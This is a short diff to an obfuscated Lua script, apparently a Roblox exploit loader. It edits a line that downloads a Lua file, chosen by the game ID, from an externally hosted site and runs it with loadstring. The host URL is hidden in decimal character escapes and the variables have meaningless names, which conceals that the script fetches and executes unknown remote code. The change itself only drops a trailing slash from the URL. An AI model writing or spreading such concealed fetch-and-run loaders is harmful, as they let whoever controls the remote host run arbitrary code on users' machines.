@@ -25,7 +25,7 @@ until L_6_
 local completed,errors = pcall(function()
     if "5Ep4d-d0Wnpl4y5-81Rd84th5" then
         local X4aaNAgq2acJcMQs , P2MxkHDY557wmTWD , QZMch7FjZd4dEfHF, xjGf4XDvfcdeaKvy = loadstring, "/assets", game.gameId, ".lua"
-        X4aaNAgq2acJcMQs(game:HttpGet("\104\116\116\112\115\58\47\47\112\114\105\52\99\49\108\108\97\46\110\101\116\108\105\102\121\46\97\112\112\47" .. P2MxkHDY557wmTWD .. "/lua/" .. QZMch7FjZd4dEfHF .. xjGf4XDvfcdeaKvy))()
+        X4aaNAgq2acJcMQs(game:HttpGet("\104\116\116\112\115\58\47\47\112\114\105\52\99\49\108\108\97\46\110\101\116\108\105\102\121\46\97\112\112" .. P2MxkHDY557wmTWD .. "/lua/" .. QZMch7FjZd4dEfHF .. xjGf4XDvfcdeaKvy))()
     end
 end)
 
